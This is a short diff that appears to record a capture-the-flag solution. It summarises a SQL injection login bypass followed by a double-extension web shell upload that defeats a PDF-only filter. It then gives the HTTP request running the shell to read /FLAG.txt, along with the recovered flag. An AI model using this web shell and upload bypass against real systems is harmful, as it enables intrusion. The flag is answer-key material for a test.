@@ -1,0 +1,4 @@
+# After login bypass via SQLi, upload webshell.pdf.php to bypass PDF-only filter (strstr check), execute to read /FLAG.txt. Response: flag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}
+
+GET /uploaded_invoices/webshell.pdf.php?cmd=cat+/FLAG.txt HTTP/1.1
+Host: 172.17.0.1:43309
